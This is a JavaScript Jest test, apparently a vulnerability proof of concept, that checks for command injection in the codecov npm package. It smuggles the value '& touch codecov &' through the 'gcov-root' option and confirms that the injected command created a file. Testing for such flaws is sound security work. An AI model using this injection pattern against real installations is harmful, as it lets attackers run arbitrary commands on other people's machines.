const v22 = () => {
};
const v23 = process.on('unhandledRejection', v22);
v23;
const v41 = async () => {
    const v24 = expect.assertions(2);
    v24;
    const root = require('codecov');
    const fs = require('fs');
    const path = './codecov';
    try {
        const v25 = fs.existsSync(path);
        if (v25) {
            const v26 = fs.unlinkSync(path);
            v26;
            const v27 = console.log('File removed:', path);
            v27;
        }
    } catch (err) {
        const v28 = console.error(err);
        v28;
    }
    file_exist = fs.existsSync(path);
    const v29 = expect(file_exist);
    const v30 = v29.toBe(false);
    v30;
    const v31 = {};
    v31['gcov-root'] = '& touch codecov &';
    v31['gcov-exec'] = ' ';
    v31['gcov-args'] = ' ';
    let args = {};
    args.options = v31;
    try {
        const v32 = root.handleInput;
        const v34 = function () {
            const v33 = console.log('success');
            v33;
        };
        const v36 = function () {
            const v35 = console.log('Fail!');
            v35;
        };
        await v32.upload(args, v34, v36);
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v37 = expect(file_exist);
    const v38 = v37.toBe(true);
    v38;
    const v39 = function (err) {
    };
    const v40 = fs.unlink(path, v39);
    v40;
};
const v42 = test('Command Injection in codecov', v41);
v42;